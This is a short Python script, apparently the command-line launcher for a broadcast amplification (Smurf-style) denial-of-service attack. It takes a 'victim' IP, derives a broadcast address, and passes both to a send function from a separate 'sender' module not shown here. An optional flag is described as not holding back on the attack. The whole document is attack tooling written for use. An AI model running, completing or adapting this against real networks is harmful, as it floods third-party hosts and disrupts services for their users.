
import sys
import time

args = sys.argv[1:]

if len(args) == 0:
	exit(0)

#First parameter contains victim's IP
victim = args[0]

#Second parameter contains broadcast IP (default x.x.255.255)
if len(args) < 2:
	target = victim.split('.')
	target[-2:]=('255','255')
	target = '.'.join(target)
else:
	target = args[1]

#If a third parameter is informed, then we don't hold back on the attack
holdback = len(args) <= 2

from sender import send

send(target,victim, holdback,0)